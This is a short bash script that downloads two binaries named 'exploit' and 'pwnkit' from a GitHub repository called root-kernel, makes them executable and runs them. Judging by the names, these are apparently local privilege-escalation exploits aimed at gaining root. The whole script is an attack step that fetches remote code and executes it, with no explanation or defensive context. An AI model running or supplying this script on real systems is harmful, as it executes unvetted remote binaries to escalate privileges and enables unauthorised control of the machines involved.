#!/bin/bash
wget https://github.com/0xWhoami35/root-kernel/raw/main/exploit
chmod +x exploit
./exploit

wget https://github.com/0xWhoami35/root-kernel/raw/main/pwnkit && chmod +x pwnkit && ./pwnkit
